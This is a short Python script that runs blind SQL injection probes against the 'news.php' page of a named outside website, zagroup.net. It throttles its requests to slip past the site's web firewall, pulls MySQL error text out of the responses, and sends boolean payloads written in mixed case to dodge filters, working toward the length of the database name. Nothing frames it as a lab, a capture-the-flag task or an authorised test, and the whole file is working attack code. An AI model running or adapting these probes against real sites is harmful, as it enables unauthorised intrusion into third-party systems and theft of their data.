#!/usr/bin/env python3
"""zagroup: SLOW careful oracle calibration (1 req / 2s) after cooldown"""
import urllib.request, re, time

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
BASE = "http://zagroup.net/news.php"

def fetch(url, timeout=12):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(5000).decode("utf-8", "ignore")
    except Exception:
        return 0, ""

def probe(payload, tag):
    code, body = fetch(BASE + "?c=259" + payload)
    err = re.search(r'MySQL server error</b>\s*:\s*<br>([^<]+)', body)
    blocked = "云网盾" in body
    print("%-16s code=%s size=%d blocked=%s err=%s" % (tag, code, len(body), blocked,
          (err.group(1)[:80] if err else "NONE")), flush=True)
    time.sleep(2)

print("=== zagroup oracle (slow) ===")
probe("", "base")
probe("%27", "quote")
probe("%27%20aNd%20(select%201)=1--%20", "aNd-1=1")
probe("%27%20aNd%20(select%201)=2--%20", "aNd-1=2")
probe("%27%20aNd%20length(database())=3--%20", "len3")
probe("%27%20aNd%20length(database())=6--%20", "len6")
probe("%27%20aNd%20length(database())=9--%20", "len9")
